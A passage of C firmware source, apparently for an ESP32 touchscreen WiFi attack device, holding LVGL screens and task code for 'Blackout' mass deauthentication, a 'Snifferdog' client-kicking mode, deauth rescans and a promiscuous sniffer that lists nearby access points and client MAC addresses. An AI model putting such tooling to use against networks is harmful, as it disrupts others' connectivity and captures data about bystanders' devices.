    lv_obj_set_style_bg_color(cont, ui_bg_color(), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(cont, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    
    if (icon) {
        lv_obj_t *img = lv_img_create(cont);
        lv_img_set_src(img, icon);
        lv_obj_set_width(img, 30);  // 1.5x bigger icon (was 20, now 30)
        lv_obj_set_style_text_color(img, ui_text_color(), 0);
    }
    
    if (text) {
        lv_obj_t *label = lv_label_create(cont);
        lv_label_set_text(label, text);
        lv_label_set_long_mode(label, LV_LABEL_LONG_SCROLL_CIRCULAR);  // Scrolling animation
        lv_obj_set_width(label, 180);  // 1.5x bigger (was 120, now 180)
        lv_obj_set_style_text_font(label, &lv_font_montserrat_20, 0);  // Bigger font (was 14, now 20)
        lv_obj_set_style_text_color(label, ui_text_color(), 0);
        lv_obj_set_style_anim_time(label, 2000, 0);  // 2 second animation cycle
        lv_obj_set_style_anim_speed(label, 25, 0);  // Animation speed (pixels/sec)
    }
    
    return cont;
}

lv_obj_t *create_clickable_item(lv_obj_t *parent, const char *icon, const char *text, lv_event_cb_t callback, const char *user_data)
{
    // Create button instead of menu_cont for clickable items
    lv_obj_t *btn = lv_btn_create(parent);
    lv_obj_set_size(btn, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_color(btn, ui_bg_color(), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    lv_obj_set_style_radius(btn, 5, 0);
    lv_obj_set_style_pad_all(btn, 12, 0);  // 1.5x bigger (was 8, now 12)
    lv_obj_set_style_pad_gap(btn, 8, 0);  // 1.5x bigger (was 5, now 8)
    lv_obj_set_flex_flow(btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    if (icon) {
        lv_obj_t *icon_label = lv_label_create(btn);
        lv_label_set_text(icon_label, icon);
        lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_20, 0);  // Bigger (was 14, now 20)
        lv_obj_set_style_text_color(icon_label, ui_text_color(), 0);
    }
    
    if (text) {
        lv_obj_t *label = lv_label_create(btn);
        lv_label_set_text(label, text);
        lv_label_set_long_mode(label, LV_LABEL_LONG_SCROLL_CIRCULAR);
        lv_obj_set_width(label, 180);  // 1.5x bigger (was 120, now 180)
        lv_obj_set_style_text_font(label, &lv_font_montserrat_20, 0);  // Bigger (was 14, now 20)
        lv_obj_set_style_text_color(label, ui_text_color(), 0);
        lv_obj_set_style_anim_time(label, 2000, 0);
        lv_obj_set_style_anim_speed(label, 25, 0);
    }
    
    if (callback && user_data) {
        lv_obj_add_event_cb(btn, callback, LV_EVENT_CLICKED, (void*)user_data);
    }
    
    return btn;
}

void back_to_menu_cb(lv_event_t *e)
{
    (void)e;
    // Check if we should return to sniffer screen instead of menu
    if (sniffer_return_pending) {
        sniffer_return_pending = false;
        // Trigger sniffer screen recreation by calling sniffer_yes_btn_cb
        lv_event_t synthetic_event;
        memset(&synthetic_event, 0, sizeof(synthetic_event));
        sniffer_yes_btn_cb(&synthetic_event);
        return;
    }
    // Defer navigation to main loop to avoid deleting objects during event handling
    nav_to_menu_flag = true;
}

// Timer callback for periodic deauth rescan
static void deauth_rescan_timer_cb(void *arg)
{
    (void)arg;
    // Set flag to trigger rescan in main loop (don't do heavy work in timer callback)
    if (!deauth_rescan_active) {
        deauth_rescan_pending = true;
    }
}

static void deauth_rescan_timer_start(void)
{
    if (deauth_rescan_timer != NULL) {
        esp_timer_stop(deauth_rescan_timer);
        esp_timer_delete(deauth_rescan_timer);
        deauth_rescan_timer = NULL;
    }
    
    const esp_timer_create_args_t timer_args = {
        .callback = &deauth_rescan_timer_cb,
        .name = "deauth_rescan"
    };
    
    if (esp_timer_create(&timer_args, &deauth_rescan_timer) == ESP_OK) {
        esp_timer_start_periodic(deauth_rescan_timer, DEAUTH_RESCAN_INTERVAL_MS * 1000);
        ESP_LOGI(TAG, "Deauth rescan timer started (every %d seconds)", DEAUTH_RESCAN_INTERVAL_MS / 1000);
    }
}

static void deauth_rescan_timer_stop(void)
{
    if (deauth_rescan_timer != NULL) {
        esp_timer_stop(deauth_rescan_timer);
        esp_timer_delete(deauth_rescan_timer);
        deauth_rescan_timer = NULL;
        ESP_LOGI(TAG, "Deauth rescan timer stopped");
    }
    deauth_rescan_pending = false;
    deauth_rescan_active = false;
    deauth_rescan_done_flag = false;
}

static void deauth_quit_event_cb(lv_event_t *e)
{
    (void)e;
    // Stop rescan timer
    deauth_rescan_timer_stop();
    // Stop all attacks (deauth, evil twin, etc.)
    wifi_attacks_stop_all();
    deauth_stop_flag = true;
    deauth_paused = false;
    // Navigate back to menu
    nav_to_menu_flag = true;
}

static void blackout_yes_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Recreate base page to keep title bar
    create_function_page_base("Blackout");
    
    // Set blackout UI active flag
    blackout_ui_active = true;
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    
    // Content container
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 70);
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 35);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_radius(content, 0, 0);
    lv_obj_set_style_pad_all(content, 12, 0);
    lv_obj_set_style_pad_row(content, 10, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    blackout_networks_label = lv_label_create(content);
    lv_label_set_text(blackout_networks_label, "Networks attacked: 0");
    lv_obj_set_style_text_font(blackout_networks_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(blackout_networks_label, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_text_align(blackout_networks_label, LV_TEXT_ALIGN_CENTER, 0);
    
    blackout_status_label = lv_label_create(content);
    lv_label_set_text(blackout_status_label, "Status: Re-scanning");
    lv_obj_set_style_text_font(blackout_status_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(blackout_status_label, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_text_align(blackout_status_label, LV_TEXT_ALIGN_CENTER, 0);
    
    // Stop & Exit button (handshaker style)
    blackout_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(blackout_stop_btn, 120, 55);
    lv_obj_align(blackout_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(blackout_stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(blackout_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(blackout_stop_btn, 0, 0);
    lv_obj_set_style_radius(blackout_stop_btn, 10, 0);
    lv_obj_set_style_shadow_width(blackout_stop_btn, 6, 0);
    lv_obj_set_style_shadow_color(blackout_stop_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(blackout_stop_btn, LV_OPA_40, 0);
    lv_obj_set_flex_flow(blackout_stop_btn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(blackout_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    lv_obj_t *x_icon = lv_label_create(blackout_stop_btn);
    lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(x_icon, ui_text_color(), 0);
    
    lv_obj_t *stop_text = lv_label_create(blackout_stop_btn);
    lv_label_set_text(stop_text, "Exit");
    lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(stop_text, ui_text_color(), 0);
    
    lv_obj_add_event_cb(blackout_stop_btn, blackout_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Start blackout attack
    wifi_attacks_start_blackout();
}

static void blackout_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    // Stop blackout attack
    wifi_attacks_stop_all();
    blackout_disable_log_capture();
    blackout_networks_label = NULL;
    blackout_status_label = NULL;
    blackout_stop_btn = NULL;
    blackout_ui_active = false;  // Clear blackout UI active flag
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    // Navigate back to menu
    nav_to_menu_flag = true;
}

static void snifferdog_yes_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Recreate base page to keep title bar
    create_function_page_base("Snifferdog");
    
    // Set snifferdog UI active flag
    snifferdog_ui_active = true;
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    
    // Reset counters
    portENTER_CRITICAL(&snifferdog_stats_spin);
    snifferdog_kick_count = 0;
    strncpy(snifferdog_last_pair, "N/A", sizeof(snifferdog_last_pair));
    snifferdog_last_pair[sizeof(snifferdog_last_pair) - 1] = '\0';
    portEXIT_CRITICAL(&snifferdog_stats_spin);
    
    // Status panel
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 35 - 43);
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 35);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_radius(content, 0, 0);
    lv_obj_set_style_pad_all(content, 12, 0);
    lv_obj_set_style_pad_row(content, 12, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    snifferdog_kick_label = lv_label_create(content);
    lv_label_set_text(snifferdog_kick_label, "Kicked out: 0");
    lv_obj_set_style_text_font(snifferdog_kick_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(snifferdog_kick_label, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_text_align(snifferdog_kick_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_width(snifferdog_kick_label, lv_pct(95));
    lv_label_set_long_mode(snifferdog_kick_label, LV_LABEL_LONG_WRAP);

    snifferdog_recent_label = lv_label_create(content);
    lv_label_set_text(snifferdog_recent_label, "Last kick:\nN/A");
    lv_obj_set_style_text_font(snifferdog_recent_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(snifferdog_recent_label, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_text_align(snifferdog_recent_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_width(snifferdog_recent_label, lv_pct(95));
    lv_label_set_long_mode(snifferdog_recent_label, LV_LABEL_LONG_WRAP);

    // Exit button (compact row)
    snifferdog_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(snifferdog_stop_btn, 110, 28);
    lv_obj_align(snifferdog_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(snifferdog_stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(snifferdog_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(snifferdog_stop_btn, 0, 0);
    lv_obj_set_style_radius(snifferdog_stop_btn, 8, 0);
    lv_obj_set_style_shadow_width(snifferdog_stop_btn, 4, 0);
    lv_obj_set_style_shadow_color(snifferdog_stop_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(snifferdog_stop_btn, LV_OPA_40, 0);
    lv_obj_set_style_pad_ver(snifferdog_stop_btn, 4, 0);
    lv_obj_set_style_pad_hor(snifferdog_stop_btn, 8, 0);
    lv_obj_set_style_pad_column(snifferdog_stop_btn, 4, 0);
    lv_obj_set_flex_flow(snifferdog_stop_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(snifferdog_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *x_icon = lv_label_create(snifferdog_stop_btn);
    lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(x_icon, ui_text_color(), 0);

    lv_obj_t *stop_text = lv_label_create(snifferdog_stop_btn);
    lv_label_set_text(stop_text, "Exit");
    lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(stop_text, ui_text_color(), 0);

    lv_obj_add_event_cb(snifferdog_stop_btn, snifferdog_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Start snifferdog attack (custom implementation)
    if (sniffer_dog_active) {
        ESP_LOGI(TAG, "Snifferdog already active");
        return;
    }
    
    ESP_LOGI(TAG, "Starting Snifferdog...");
    sniffer_dog_active = true;
    
    // Set promiscuous filter
    esp_wifi_set_promiscuous_filter(&sniffer_filter);
    
    // Enable promiscuous mode with our callback
    esp_wifi_set_promiscuous_rx_cb(sniffer_dog_promiscuous_callback);
    esp_wifi_set_promiscuous(true);
    
    // Initialize dual-band channel hopping
    sniffer_dog_channel_index = 0;
    sniffer_dog_current_channel = dual_band_channels[0];
    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Create channel hopping task with PSRAM stack
    sniffer_dog_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (sniffer_dog_task_stack != NULL) {
        sniffer_dog_task_handle = xTaskCreateStatic(sniffer_dog_task, "sniffer_dog", 4096, NULL, 
            5, sniffer_dog_task_stack, &sniffer_dog_task_buffer);
        if (sniffer_dog_task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create sniffer_dog task");
            heap_caps_free(sniffer_dog_task_stack);
            sniffer_dog_task_stack = NULL;
        } else {
            ESP_LOGI(TAG, "Snifferdog task created with PSRAM stack");
        }
    } else {
        ESP_LOGE(TAG, "Failed to allocate sniffer_dog task stack from PSRAM");
    }
    
    ESP_LOGI(TAG, "Snifferdog started - hunting for AP-STA pairs...");
}

static void snifferdog_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop snifferdog attack
    if (sniffer_dog_active || sniffer_dog_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping Snifferdog...");
        sniffer_dog_active = false;
        
        // Wait for task to finish gracefully (up to 7 seconds)
        for (int i = 0; i < 70 && sniffer_dog_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        // Only cleanup stack if task finished on its own
        if (sniffer_dog_task_handle == NULL && sniffer_dog_task_stack != NULL) {
            heap_caps_free(sniffer_dog_task_stack);
            sniffer_dog_task_stack = NULL;
        }
        
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);   /* clear stale callback */
        wifi_scanner_abort();                   /* un-stick g_scan_in_progress */
        sniffer_dog_channel_index = 0;
        sniffer_dog_current_channel = dual_band_channels[0];
        sniffer_dog_last_channel_hop = 0;

        ESP_LOGI(TAG, "Snifferdog stopped");
    }
    snifferdog_disable_log_capture();
    snifferdog_kick_label = NULL;
    snifferdog_recent_label = NULL;
    snifferdog_stop_btn = NULL;
    portENTER_CRITICAL(&snifferdog_stats_spin);
    snifferdog_kick_count = 0;
    strncpy(snifferdog_last_pair, "N/A", sizeof(snifferdog_last_pair));
    snifferdog_last_pair[sizeof(snifferdog_last_pair) - 1] = '\0';
    portEXIT_CRITICAL(&snifferdog_stats_spin);
    snifferdog_ui_active = false;  // Clear snifferdog UI active flag
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    // Navigate back to menu
    nav_to_menu_flag = true;
}

// Forward declaration already exists at line 376 for attack_event_cb

static void sniffer_start_btn_cb(lv_event_t *e)
{
    (void)e;
    
    if (sniffer_task_active) {
        // Stop the sniffer
        ESP_LOGI(TAG, "Stopping WiFi Sniffer...");
        sniffer_task_active = false;
        
        // Wait for task to finish gracefully (up to 7 seconds)
        for (int i = 0; i < 70 && sniffer_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        // Only cleanup stack if task finished on its own
        if (sniffer_task_handle == NULL && sniffer_task_stack != NULL) {
            heap_caps_free(sniffer_task_stack);
            sniffer_task_stack = NULL;
        }
        
        // Update button to show START
        lv_label_set_text(lv_obj_get_child(sniffer_start_btn, 0), "Start");
        lv_obj_set_style_bg_color(sniffer_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(sniffer_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
    } else {
        // Start the sniffer
        ESP_LOGI(TAG, "Starting WiFi Sniffer...");
        sniffer_task_active = true;
        sniffer_start_time = (uint32_t)(esp_timer_get_time() / 1000);  // Record start time for delayed sorting
        
        // Create sniffer task with PSRAM stack (16KB to avoid stack overflow during cleanup)
        sniffer_task_stack = (StackType_t *)heap_caps_malloc(16384 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
        if (sniffer_task_stack != NULL) {
            sniffer_task_handle = xTaskCreateStatic(sniffer_task, "sniffer", 16384, NULL, 
                5, sniffer_task_stack, &sniffer_task_buffer);
            if (sniffer_task_handle == NULL) {
                ESP_LOGE(TAG, "Failed to create sniffer task");
                heap_caps_free(sniffer_task_stack);
                sniffer_task_stack = NULL;
                sniffer_task_active = false;
            } else {
                ESP_LOGI(TAG, "Sniffer task created with PSRAM stack");
                // Update button to show STOP
                lv_label_set_text(lv_obj_get_child(sniffer_start_btn, 0), "Stop");
                lv_obj_set_style_bg_color(sniffer_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
                lv_obj_set_style_bg_color(sniffer_start_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
            }
        } else {
            ESP_LOGE(TAG, "Failed to allocate sniffer task stack from PSRAM");
            sniffer_task_active = false;
        }
    }
}

// Update the Start/Stop button UI based on `sniffer_task_active`
static void update_sniffer_button_ui(void)
{
    if (sniffer_start_btn == NULL) return;
    lv_obj_t *lbl = lv_obj_get_child(sniffer_start_btn, 0);
    if (lbl == NULL) return;

    if (sniffer_task_active) {
        lv_label_set_text(lbl, "Stop");
        lv_obj_set_style_bg_color(sniffer_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(sniffer_start_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    } else {
        lv_label_set_text(lbl, "Start");
        lv_obj_set_style_bg_color(sniffer_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(sniffer_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
    }
}

static void sniffer_stop_only_btn_cb(lv_event_t *e)
{
    (void)e;
    
    if (sniffer_task_active || sniffer_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping WiFi Sniffer...");
        sniffer_task_active = false;
        
        // Wait for task to finish gracefully (up to 7 seconds - must be longer than
        // wifi_sniffer_stop internal timeout of 5s to avoid stack overflow from force delete)
        for (int i = 0; i < 70 && sniffer_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        // Only cleanup stack if task finished on its own
        if (sniffer_task_handle == NULL && sniffer_task_stack != NULL) {
            heap_caps_free(sniffer_task_stack);
            sniffer_task_stack = NULL;
        }
        
        ESP_LOGI(TAG, "Sniffer stopped");
    }
}

static void sniffer_nav_clients_cb(lv_event_t *e)
{
    (void)e;
    sniffer_return_pending = true;  // Mark that we should return to sniffer
    lv_event_t synthetic_event;
    memset(&synthetic_event, 0, sizeof(synthetic_event));
    synthetic_event.user_data = (void*)"Browse Clients";
    attack_event_cb(&synthetic_event);
}

static void sniffer_nav_probes_cb(lv_event_t *e)
{
    (void)e;
    sniffer_return_pending = true;  // Mark that we should return to sniffer
    lv_event_t synthetic_event;
    memset(&synthetic_event, 0, sizeof(synthetic_event));
    synthetic_event.user_data = (void*)"Show Probes";
    attack_event_cb(&synthetic_event);
}

static void sniffer_nav_karma_cb(lv_event_t *e)
{
    (void)e;
    sniffer_return_pending = true;  // Mark that we should return to sniffer
    lv_event_t synthetic_event;
    memset(&synthetic_event, 0, sizeof(synthetic_event));
    synthetic_event.user_data = (void*)"Karma";
    attack_event_cb(&synthetic_event);
}

static void sniffer_quit_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop sniffer task but KEEP data in PSRAM
    if (sniffer_task_active || sniffer_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping WiFi Sniffer (keeping data)...");
        sniffer_task_active = false;
        
        // Wait for task to finish gracefully (up to 7 seconds)
        for (int i = 0; i < 70 && sniffer_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        // Only cleanup stack if task finished on its own
        if (sniffer_task_handle == NULL && sniffer_task_stack != NULL) {
            heap_caps_free(sniffer_task_stack);
            sniffer_task_stack = NULL;
        }
    }
    
    // Stop promiscuous mode but DO NOT clear data
    wifi_sniffer_stop();
    
    // Cleanup UI state
    sniffer_disable_log_capture();
    sniffer_log_ta = NULL;
    sniffer_stop_btn = NULL;
    sniffer_start_btn = NULL;
    sniffer_packets_label = NULL;
    sniffer_aps_label = NULL;
    sniffer_probes_label = NULL;
    sniffer_ui_active = false;
    sniffer_return_pending = false;
    scan_done_ui_flag = false;
    
    ESP_LOGI(TAG, "Sniffer quit - data preserved in PSRAM");
    
    // Navigate back to menu
    nav_to_menu_flag = true;
}

// Rescan callback - clears all data and restarts fresh scan
static void sniffer_rescan_cb(lv_event_t *e)
{
    (void)e;
    
    ESP_LOGI(TAG, "Rescan requested - clearing all sniffer data...");
    
    // Stop sniffer if running
    if (sniffer_task_active || sniffer_task_handle != NULL) {
        sniffer_task_active = false;
        
        // Wait for task to finish gracefully (up to 7 seconds)
        for (int i = 0; i < 70 && sniffer_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        // Only cleanup stack if task finished on its own
        if (sniffer_task_handle == NULL && sniffer_task_stack != NULL) {
            heap_caps_free(sniffer_task_stack);
            sniffer_task_stack = NULL;
        }
    }
    
    // Ensure promiscuous mode is off (task already called wifi_sniffer_stop if it finished)
    if (wifi_sniffer_is_active()) {
        wifi_sniffer_stop();
    }
    
    // Clear all sniffer data
    wifi_sniffer_clear_data();
    
    // Reset sort order so next refresh will re-sort by RSSI
    sniffer_sorted_count = 0;
    sniffer_initial_sort_done = false;
    
    // Clear selected networks
    wifi_scanner_clear_selections();
    g_shared_selected_count = 0;
    
    // Refresh the UI immediately
    sniffer_refresh_ap_list();
    
    // Restart sniffer
    sniffer_task_active = true;
    sniffer_start_time = (uint32_t)(esp_timer_get_time() / 1000);  // Record start time for delayed sorting
    sniffer_task_stack = (StackType_t *)heap_caps_malloc(16384 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (sniffer_task_stack != NULL) {
        sniffer_task_handle = xTaskCreateStatic(sniffer_task, "sniffer", 16384, NULL, 
            5, sniffer_task_stack, &sniffer_task_buffer);
        if (sniffer_task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create sniffer task");
            heap_caps_free(sniffer_task_stack);
            sniffer_task_stack = NULL;
            sniffer_task_active = false;
        } else {
            ESP_LOGI(TAG, "Sniffer restarted with fresh data");
        }
    }
}

// Notify that a new client was found (called from sniffer callback)
static void sniffer_new_client_notify(void) {
    sniffer_ui_needs_refresh = true;
}

// Refresh the AP list in sniffer UI
static void sniffer_refresh_ap_list(void) {
    if (!sniffer_ap_list || !sniffer_ui_active) return;
    
    // Save scroll position before refresh
    lv_coord_t scroll_y = lv_obj_get_scroll_y(sniffer_ap_list);
    
    // Clear existing list items
    lv_obj_clean(sniffer_ap_list);
    
    int ap_count = 0;
    const sniffer_ap_t *aps = wifi_sniffer_get_aps(&ap_count);
    
    if (ap_count == 0 || aps == NULL) {
        lv_obj_t *msg_label = lv_label_create(sniffer_ap_list);
        lv_label_set_text(msg_label, "Scanning...");
        lv_obj_set_style_text_color(msg_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
        return;
    }
    
    // Stable sort order - only sort once, then keep order fixed
    // Allocate sorted indices array if needed
    if (sniffer_sorted_indices == NULL) {
        sniffer_sorted_indices = (int *)heap_caps_malloc(MAX_SNIFFER_APS * sizeof(int), MALLOC_CAP_SPIRAM);
        if (sniffer_sorted_indices == NULL) {
            ESP_LOGE(TAG, "Failed to allocate sniffer_sorted_indices");
            return;
        }
        sniffer_sorted_count = 0;
        sniffer_initial_sort_done = false;
    }
    
    int max_display = (ap_count < MAX_SNIFFER_APS) ? ap_count : MAX_SNIFFER_APS;
    uint32_t now = (uint32_t)(esp_timer_get_time() / 1000);
    uint32_t elapsed = now - sniffer_start_time;
    
    // Wait 10 seconds before sorting to allow full channel scan
    if (!sniffer_initial_sort_done && ap_count > 0 && elapsed > 10000) {
        // First time (after 10s): sort all networks by RSSI (strongest first)
        for (int i = 0; i < max_display; i++) sniffer_sorted_indices[i] = i;
        for (int i = 0; i < max_display - 1; i++) {
            for (int j = i + 1; j < max_display; j++) {
                if (aps[sniffer_sorted_indices[j]].rssi > aps[sniffer_sorted_indices[i]].rssi) {
                    int tmp = sniffer_sorted_indices[i];
                    sniffer_sorted_indices[i] = sniffer_sorted_indices[j];
                    sniffer_sorted_indices[j] = tmp;
                }
            }
        }
        sniffer_sorted_count = max_display;
        sniffer_initial_sort_done = true;
        sniffer_last_sort_time = now;
        ESP_LOGI(TAG, "Sorted %d networks by RSSI after 10s scan", max_display);
    } else if (!sniffer_initial_sort_done && ap_count > 0) {
        // Before 10s: just show networks in discovery order (unsorted)
        for (int i = sniffer_sorted_count; i < max_display; i++) {
            sniffer_sorted_indices[i] = i;
        }
        sniffer_sorted_count = max_display;
    } else if (sniffer_initial_sort_done && (now - sniffer_last_sort_time > 60000)) {
        // Re-sort all networks by RSSI every 60 seconds
        for (int i = sniffer_sorted_count; i < max_display; i++) {
            sniffer_sorted_indices[i] = i;
        }
        sniffer_sorted_count = max_display;
        for (int i = 0; i < sniffer_sorted_count - 1; i++) {
            for (int j = i + 1; j < sniffer_sorted_count; j++) {
                if (aps[sniffer_sorted_indices[j]].rssi > aps[sniffer_sorted_indices[i]].rssi) {
                    int tmp = sniffer_sorted_indices[i];
                    sniffer_sorted_indices[i] = sniffer_sorted_indices[j];
                    sniffer_sorted_indices[j] = tmp;
                }
            }
        }
        sniffer_last_sort_time = now;
        ESP_LOGI(TAG, "Re-sorted %d networks by RSSI", sniffer_sorted_count);
    } else if (ap_count > sniffer_sorted_count) {
        // Between re-sorts: new networks append to end
        for (int i = sniffer_sorted_count; i < max_display; i++) {
            sniffer_sorted_indices[i] = i;
        }
        sniffer_sorted_count = max_display;
    }
    
    for (int idx = 0; idx < sniffer_sorted_count; idx++) {
        int i = sniffer_sorted_indices[idx];
        const sniffer_ap_t *ap = &aps[i];
        
        // Create clickable AP row (text style, black background, arrow to hint clickability)
        char ap_text[128];
        if (ap->ssid[0] != '\0') {
            snprintf(ap_text, sizeof(ap_text), LV_SYMBOL_WIFI " %s (%d) Ch:%d %ddBm " LV_SYMBOL_RIGHT,
                     ap->ssid, ap->client_count, ap->channel, ap->rssi);
        } else {
            snprintf(ap_text, sizeof(ap_text), LV_SYMBOL_WIFI " [Hidden] (%d) Ch:%d %ddBm " LV_SYMBOL_RIGHT,
                     ap->client_count, ap->channel, ap->rssi);
        }
        
        lv_obj_t *ap_row = lv_list_add_text(sniffer_ap_list, ap_text);
        lv_obj_set_style_bg_color(ap_row, ui_bg_color(), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(ap_row, lv_color_make(40, 40, 60), LV_STATE_PRESSED);
        lv_obj_set_style_bg_opa(ap_row, LV_OPA_COVER, 0);
        lv_obj_set_style_text_color(ap_row, ui_text_color(), 0);
        lv_obj_set_style_text_font(ap_row, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_decor(ap_row, LV_TEXT_DECOR_UNDERLINE, 0);
        lv_obj_set_style_min_height(ap_row, 36, 0);  // Larger touch target
        lv_obj_add_flag(ap_row, LV_OBJ_FLAG_CLICKABLE);
        lv_obj_add_event_cb(ap_row, sniffer_ap_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)i);
        
        // Show clients for this AP (indented sub-list style)
        for (int j = 0; j < ap->client_count && j < 5; j++) {
            const sniffer_client_t *client = &ap->clients[j];
            
            char client_text[40];
            snprintf(client_text, sizeof(client_text), LV_SYMBOL_BULLET " %02X:%02X:%02X:%02X:%02X:%02X  %ddBm",
                     client->mac[0], client->mac[1], client->mac[2],
                     client->mac[3], client->mac[4], client->mac[5], client->rssi);
            
            lv_obj_t *client_row = lv_list_add_text(sniffer_ap_list, client_text);
            lv_obj_set_style_bg_color(client_row, ui_bg_color(), 0);
            lv_obj_set_style_bg_opa(client_row, LV_OPA_COVER, 0);
            lv_obj_set_style_text_color(client_row, COLOR_MATERIAL_GREEN, 0);
            lv_obj_set_style_text_font(client_row, &lv_font_montserrat_12, 0);
            lv_obj_set_style_pad_left(client_row, 35, 0);  // Larger indent for sub-list
        }
        
